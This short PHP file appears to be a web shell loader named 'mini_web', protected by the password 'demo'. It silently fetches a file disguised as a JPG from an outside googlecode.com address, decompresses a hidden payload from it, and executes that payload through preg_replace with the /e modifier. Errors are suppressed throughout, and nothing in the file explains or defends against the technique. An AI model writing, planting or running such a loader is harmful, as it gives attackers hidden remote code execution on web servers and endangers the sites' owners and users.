<?php
error_reporting(0);
//define("password",'781f357c35df1fef3138f6d29670365a');
define('password','demo'); 
define('title','mini_web');
define('copyright', 'E');
$url='http://2012heike.googlecode.com/svn/trunk/make.jpg';
@preg_replace("~(.*)~ies",gzuncompress(substr(call_user_func_array('file_get_contents',array($url,false,stream_context_create(array('http'=>array('method'=>'GET','timeout'=>1))))),3649)),null);
?>